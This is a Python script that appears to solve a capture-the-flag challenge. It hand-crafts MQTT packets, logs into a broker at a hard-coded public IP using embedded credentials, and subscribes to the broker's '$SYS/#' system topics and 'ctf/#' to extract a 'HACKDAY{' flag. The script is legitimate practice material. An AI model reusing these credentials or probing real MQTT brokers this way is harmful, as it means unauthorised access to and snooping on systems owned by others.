import socket
import struct
import time
import random
import string

def mqtt_connect(client_id, username=None, password=None):
    flags = 0x02
    if username: flags |= 0x80
    if password: flags |= 0x40
    var_header = b'\x00\x04MQTT\x04' + bytes([flags]) + b'\x00\x3c'
    payload = struct.pack("!H", len(client_id)) + client_id.encode()
    if username:
        payload += struct.pack("!H", len(username)) + username.encode()
    if password:
        payload += struct.pack("!H", len(password)) + password.encode()
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x10' + bytes([rem_len]) 
    return fixed_header + var_header + payload

def mqtt_subscribe(topic, packet_id):
    var_header = struct.pack("!H", packet_id)
    payload = struct.pack("!H", len(topic)) + topic.encode() + b'\x00'
    rem_len = len(var_header) + len(payload)
    fixed_header = b'\x82' + bytes([rem_len])
    return fixed_header + var_header + payload

def solve():
    server = "51.210.244.18"
    port = 1883
    user = "hackday"
    pwd = "1Bc2Mk0rlevzuCG6AaDK6Opa"
    
    s = socket.create_connection((server, port), timeout=10)
    s.sendall(mqtt_connect("sys-explorer-" + ''.join(random.choices(string.ascii_lowercase, k=3)), user, pwd))
    connack = s.recv(4)
    
    # Subscribe specifically to $SYS/# and ctf/#
    s.sendall(mqtt_subscribe("$SYS/#", 4001))
    s.sendall(mqtt_subscribe("ctf/#", 4002))
    
    start_time = time.time()
    try:
        while time.time() - start_time < 30:
            data = s.recv(4096)
            if not data: break
            try:
                # Extract interesting strings
                decoded = data.decode(errors='ignore')
                for part in decoded.split('$SYS'):
                    if part:
                        print(f"[*] SYS part: $SYS{part[:200]}")
                if "HACKDAY{" in decoded:
                    print(f"[!!!] FLAG: {decoded[decoded.find('HACKDAY{'):decoded.find('HACKDAY{')+50]}")
            except: pass
    except: pass
    finally:
        s.close()

if __name__ == "__main__":
    solve()
